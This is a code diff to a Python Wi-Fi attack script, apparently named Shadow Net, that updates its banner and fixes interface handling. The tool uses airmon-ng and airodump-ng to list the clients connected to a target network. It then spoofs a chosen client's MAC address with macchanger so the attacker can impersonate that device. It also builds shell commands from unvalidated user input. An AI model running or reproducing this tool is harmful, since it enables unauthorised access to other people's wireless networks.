@@ -14,6 +14,8 @@ import os
 import time
 # We want to check that after enabling monitor mode our interface name is changed or not
 import glob
+# To Change Title Color
+from termcolor import colored
 
 # We declare an empty list where all active wireless networks will be saved to.
 active_wireless_networks = []
@@ -38,15 +40,23 @@ def check_for_essid(essid, lst):
     return check_status
 
 # Basic user interface header
-print(r"""
- /$$$$$$$$ /$$    /$$ /$$$$$$ /$$             /$$$$$$$$ /$$     /$$ /$$$$$$$$
-| $$_____/| $$   | $$|_  $$_/| $$            | $$_____/|  $$   /$$/| $$_____/
-| $$      | $$   | $$  | $$  | $$            | $$       \  $$ /$$/ | $$      
-| $$$$$   |  $$ / $$/  | $$  | $$            | $$$$$     \  $$$$/  | $$$$$   
-| $$__/    \  $$ $$/   | $$  | $$            | $$__/      \  $$/   | $$__/   
-| $$        \  $$$/    | $$  | $$            | $$          | $$    | $$      
-| $$$$$$$$   \  $/    /$$$$$$| $$$$$$$$      | $$$$$$$$    | $$    | $$$$$$$$
-|________/    \_/    |______/|________/      |________/    |__/    |________/""")
+title = ("""
+
+  /$$$$$$  /$$                       /$$                               /$$   /$$             /$$    
+ /$$__  $$| $$                      | $$                              | $$$ | $$            | $$    
+| $$  \__/| $$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$  /$$  /$$  /$$      | $$$$| $$  /$$$$$$  /$$$$$$  
+|  $$$$$$ | $$__  $$ |____  $$ /$$__  $$ /$$__  $$| $$ | $$ | $$      | $$ $$ $$ /$$__  $$|_  $$_/  
+ \____  $$| $$  \ $$  /$$$$$$$| $$  | $$| $$  \ $$| $$ | $$ | $$      | $$  $$$$| $$$$$$$$  | $$    
+ /$$  \ $$| $$  | $$ /$$__  $$| $$  | $$| $$  | $$| $$ | $$ | $$      | $$\  $$$| $$_____/  | $$ /$$
+|  $$$$$$/| $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/|  $$$$$/$$$$/      | $$ \  $$|  $$$$$$$  |  $$$$/
+ \______/ |__/  |__/ \_______/ \_______/ \______/  \_____/\___/       |__/  \__/ \_______/   \___/  
+
+   by XBEAST ~ Ignite the Dark Flame ~ Journey into the Abyss with Shadow Net's Fiendish Power!
+                                            V3.3
+                            Github Link: https://github.com/XBEAST1""")
+         
+colored_text = colored(title, 'blue')
+print(colored_text)
 
 # If the user doesn't run the program with super user privileges, don't allow them to continue.
 print ()
@@ -154,13 +164,22 @@ targetchannel = active_wireless_networks[int(choice)]["channel"].strip()
 
 os.system ('airmon-ng start ' + iface + ' ' + targetchannel)
 os.system ('airodump-ng -c ' + targetchannel + ' --bssid ' + targetbssid  + ' ' + iface)
+os.system (f'airmon-ng stop {iface}')
 
 macspoof = input("\nClients MAC Addresses Shows In The Station Tab. If It's Empty Then Run The Script Again And Wait Someone To Show Up\n\nPlease Enter Mac Address That You Want To Spoof : ")
 
-os.system (f'airmon-ng stop {iface}')
+check_iface = glob.glob('/sys/class/net/wlan*mon')
+
+if check_iface:
+    # Get the first matching interface
+    iface = os.path.basename(check_iface[0])
+
+if "mon" in iface:
+    iface = iface.replace("mon", "")
+
 os.system (f'ifconfig {iface} down')
 os.system (f'screen -d -m iwconfig {iface} mode auto\n'*10)
 os.system (f'screen -d -m macchanger -m {macspoof} {iface}\n'*100)
 os.system (f'ifconfig {iface} up')
 os.system ('service NetworkManager restart')
-os.system (f'macchanger -s {iface}')
+os.system (f'\nmacchanger -s {iface}')
